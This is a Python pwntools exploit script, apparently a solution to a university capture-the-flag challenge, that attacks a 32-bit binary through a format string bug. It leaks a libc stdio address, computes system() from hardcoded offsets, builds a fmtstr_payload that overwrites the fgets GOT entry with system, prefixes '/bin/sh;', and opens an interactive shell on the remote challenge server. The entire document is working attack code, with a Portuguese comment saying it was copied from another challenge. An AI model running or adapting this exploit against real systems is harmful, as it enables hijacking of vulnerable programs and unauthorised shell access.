#!/usr/bin/env python3

from pwn import *

e = ELF("./bin_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            
            """)
    elif cond == 3:
        r = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10153)

    return r


def main():
    r = conn(3)

    # was a copy of the challenge of format Strigs é preciso checkar se o aslr está ligado ou não e se e mudar os endereços das coias tmb-------------
    r.sendline(b"AAAA" + b".%08x"*10) # leak the stack address of buff

    offset = 6
    r.recvuntil(b"AAAA.")
    r.recvuntil(b".")
    leakStdio = int(r.recvuntil(b".")[:-1],16)

    fgetsGot = 0x804a010

    sStdio = 0xf7fcd5a0
    sSystem = 0xf7e57940
    offsetSystem = sSystem - sStdio


    leakSystem = leakStdio + offsetSystem

    print("leakSystem: " + hex(leakSystem))
    print("leakFgetsGot: " + hex(fgetsGot))
    writes = {fgetsGot: leakSystem + 16}
    payload = b"/bin/sh;" +  fmtstr_payload(offset+2, writes,numbwritten=8,  badbytes=frozenset(b" "))
    print(payload)
    r.sendline(payload)




    r.interactive()

if __name__ == "__main__":
    main()